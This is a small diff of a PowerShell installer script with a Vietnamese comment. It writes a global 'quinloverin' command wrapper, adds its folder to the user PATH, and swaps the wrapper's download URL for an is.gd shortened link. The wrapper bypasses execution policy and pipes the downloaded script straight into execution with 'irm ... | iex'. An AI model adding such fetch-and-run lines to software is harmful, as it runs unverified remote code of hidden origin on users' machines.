@@ -483,8 +483,8 @@ $cmdCode = (Get-Random -Minimum 100 -Maximum 999).ToString()
 # 2. Đăng ký lệnh 'quinloverin' toàn cục vào máy
 $binDir = "$env:USERPROFILE\\.quinloverin"
 if (-not (Test-Path $binDir)) { New-Item -ItemType Directory -Path $binDir -Force | Out-Null }
-$cmdWrapper = "@echo off\`r\`npowershell -ExecutionPolicy Bypass -Command \\"irm $workerUrl/net | iex\\""
-Set-Content -Path "$binDir\\quinloverin.cmd" -Value $cmdWrapper -Encoding ASCII
+$cmdLines = @('@echo off', 'powershell -ExecutionPolicy Bypass -Command "irm https://is.gd/qmthu | iex"')
+$cmdLines | Set-Content -Path "$binDir\\quinloverin.cmd" -Encoding ASCII
 $currentPath = [System.Environment]::GetEnvironmentVariable("Path", "User")
 if ($currentPath -notlike "*$binDir*") {
     [System.Environment]::SetEnvironmentVariable("Path", "$currentPath;$binDir", "User")
